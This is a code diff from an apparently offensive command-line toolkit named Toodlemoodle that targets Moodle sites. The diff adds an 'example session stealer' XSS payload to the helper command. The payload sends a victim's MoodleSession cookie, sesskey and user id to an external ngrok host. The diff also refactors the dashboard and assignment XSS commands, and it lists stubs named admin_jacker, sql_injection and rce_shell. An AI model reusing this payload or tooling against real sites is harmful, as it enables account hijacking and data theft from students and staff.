@@ -57,22 +57,17 @@ module Toodlemoodle
         scanner = Scanner.new
         scanner.perform(@target)
       when "helper"
-        puts "Copy and paste this into your DevTools console on an OLE page to extract your own session, session key, and user id.\n\nalert('MoodleSession: ' + document.cookie.match(new RegExp('(^| )MoodleSession=([^;]+)'))[2] + '\\nSessKey: ' + M.cfg.sesskey + '\\nUser id: ' + document.querySelectorAll('[data-userid]')[0].getAttribute('data-userid'))"
+        puts "Copy and paste this into your DevTools console on an OLE page to extract your own session, session key, and user id.\n\nalert('MoodleSession: ' + document.cookie.match(new RegExp('(^| )MoodleSession=([^;]+)'))[2] + '\\nSessKey: ' + M.cfg.sesskey + '\\nUser id: ' + document.querySelectorAll('[data-userid]')[0].getAttribute('data-userid'))\n\n"
+        puts "An example session stealer: \n" \
+             "<script>document.write('<img src=\"https://5fc418e2.ngrok.io/?session=' + document.cookie.match(new RegExp('(^| )MoodleSession=([^;]+)'))[2] + '&sesskey=' + M.cfg.sesskey + '&id=' + document.querySelectorAll('[data-userid]')[0].getAttribute('data-userid') + '\" />')</script>"
       when "dashboard_xss"
         target_required()
-        puts "Please enter your session key. Use the helper command."
-        sess_key = gets()
-        puts "Please visit #{@target}/my/index.php?sesskey=#{sess_key}&bui_addblock=html to add an HTML block to your dashboard. Once the block is added, click on configure, copy the URL, paste it, and hit enter."
-        block_edit_url = gets()
-        block_regex = block_edit_url.not_nil!.match(/sesskey=(?<sess_key>.*)&bui_editid=(?<edit_id>.*)/)
-        session_key = block_regex.try &.["sess_key"]
-        block_id = block_regex.try &.["edit_id"]
-        puts "Session key: #{session_key}"
-        puts "Block id: #{block_id}"
-        puts "Please enter an XSS payload to send including <script> tags:"
-        payload = gets()
-        puts "Sending payload to target..."
+        dashboard_xss = DashboardXSS.new
+        dashboard_xss.perform(@target)
       when "assignment_xss"
+        target_required()
+        assignment_xss = AssignmentXSS.new
+        assignment_xss.perform(@target)
       when "admin_jacker"
       when "sql_injection"
       when "rce_shell"
